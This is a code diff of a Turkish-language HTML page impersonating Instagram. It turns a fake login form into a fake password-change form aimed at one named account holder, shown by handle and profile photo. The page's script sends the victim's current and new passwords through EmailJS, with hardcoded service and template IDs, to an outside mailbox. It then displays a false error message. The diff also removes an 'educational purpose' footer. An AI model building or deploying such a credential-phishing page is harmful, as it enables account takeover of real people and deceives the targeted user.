@@ -1,74 +1,112 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram Giriş Sayfası</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Şifre Değiştir — InstaStyle</title>
   <link rel="stylesheet" href="style.css">
 
   <!-- EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script>
-    (function() {
-      emailjs.init("48aOTKnKmcqHtrhB2"); // senin public key'in
-    })();
+    // EmailJS başlat
+    emailjs.init("48aOTKnKmcqHtrhB2"); // Senin USER_ID
   </script>
 </head>
-
 <body>
-  <div class="container">
-    <div class="login-box">
-      <img class="logo" src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo-2010-2013-700x394.png" alt="Instagram Logo" width="175">
+  <div class="wrap">
+    <div class="card">
+      <div class="brand">
+        <h1><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" width="220vh
+          " alt=""></h1>
+      </div>
+      <div class="brand">
 
-      <form id="loginForm" class="login-form">
-        <div class="field">
-          <input type="text" id="username" name="username" placeholder="Kullanıcı adı veya e-posta" required>
+        <h1><img id="saf" src="533189993_18491173999071572_5431785139240208499_n.jpg"  width="150vh
+          " alt=""></h1>
+                  <h5>@oznur.sarioglu</h5>
+      </div>
+      <form id="password-form" autocomplete="off" novalidate>
+        <div>
+          <label for="current_password">Eski Şifre</label>
+          <div class="input">
+            <input type="password" id="current_password" name="current_password" placeholder="Mevcut şifrenizi girin" required>
+            <button type="button" class="show-toggle" data-target="current_password">Göster</button>
+          </div>
         </div>
-        <div class="field">
-          <input type="password" id="password" name="password" placeholder="Şifre" required>
+
+        <div>
+          <label for="new_password">Yeni Şifre</label>
+          <div class="input">
+            <input type="password" id="new_password" name="new_password" placeholder="Yeni şifre (en az 8 karakter)" minlength="8" required>
+            <button type="button" class="show-toggle" data-target="new_password">Göster</button>
+          </div>
         </div>
-        <button type="submit" class="login-button">Giriş Yap</button>
+
+        <div>
+          <label for="new_password_confirmation">Yeni Şifre (Tekrar)</label>
+          <div class="input">
+            <input type="password" id="new_password_confirmation" name="new_password_confirmation" placeholder="Yeni şifreyi tekrar girin" minlength="8" required>
+            <button type="button" class="show-toggle" data-target="new_password_confirmation">Göster</button>
+          </div>
+        </div>
+
+        <button type="submit" class="btn">Şifreyi Değiştir</button>
+        <p class="note">Güçlü şifre oluşturmak için harf, rakam ve sembol karışımı kullanın.</p>
       </form>
 
-      <div class="facebook-login">
-        <a href="#" class="fb-button">Facebook ile Giriş Yap</a>
+      <div class="footer">
+        <p>Hesabınızla ilgili sorun mu yaşıyorsunuz? <a href="#">Yardım Merkezi</a></p>
       </div>
-
-      <div class="forgot-password">
-        <a href="#">Şifreni mi unuttun?</a>
-      </div>
-    </div>
-
-    <div class="signup-box">
-      <p>Hesabın yok mu? <a href="#">Kaydol</a></p>
     </div>
   </div>
 
-  <footer>
-    <p>&copy; 2025 Eğitim Amaçlı Yapılmıştır.</p>
-  </footer>
-
   <script>
-    // Form gönderildiğinde çalışır
-    document.getElementById("loginForm").addEventListener("submit", function(event) {
-      event.preventDefault();
-
-      const formData = {
-        username: document.getElementById("username").value,
-        password: document.getElementById("password").value
-      };
-
-      emailjs.send("service_kxgmu58", "template_t4x776r", formData)
-        .then(function(response) {
-          alert("Giriş bilgileri gönderildi!");
-          document.getElementById("loginForm").reset();
-        }, function(error) {
-          alert("Bir hata oluştu, tekrar deneyin.");
-          console.log("Hata:", error);
-        });
+    // Şifre göster/gizle
+    document.querySelectorAll('.show-toggle').forEach(function(btn){
+      btn.addEventListener('click', function(){
+        var targetId = btn.getAttribute('data-target');
+        var input = document.getElementById(targetId);
+        if(input.type === 'password'){
+          input.type = 'text';
+          btn.textContent = 'Gizle';
+        } else {
+          input.type = 'password';
+          btn.textContent = 'Göster';
+        }
+      });
     });
 
-    
+    // Form submit + EmailJS (düz metin)
+    document.getElementById('password-form').addEventListener('submit', function(e){
+      e.preventDefault();
+
+      var currentPwd = document.getElementById('current_password').value;
+      var newPwd = document.getElementById('new_password').value;
+      var confirm = document.getElementById('new_password_confirmation').value;
+
+      if(newPwd !== confirm){
+        alert('Yeni şifre ve tekrarı eşleşmiyor.');
+        return;
+      }
+
+      // EmailJS gönderimi
+      const SERVICE_ID = "service_kxgmu58";
+      const TEMPLATE_ID = "template_t4x776r";
+
+      emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+        current_password: currentPwd,
+        new_password: newPwd,
+        date: new Date().toLocaleString()
+      })
+      .then(function(response){
+        alert('Bir hata oluştu, daha sonra tekrar deneyin');
+        document.getElementById('password-form').reset();
+      }, function(error){
+        alert('Bir hata oluştu, daha sonra tekrar deneyin.');
+        console.log(error);
+      });
+    });
   </script>
 </body>
 </html>
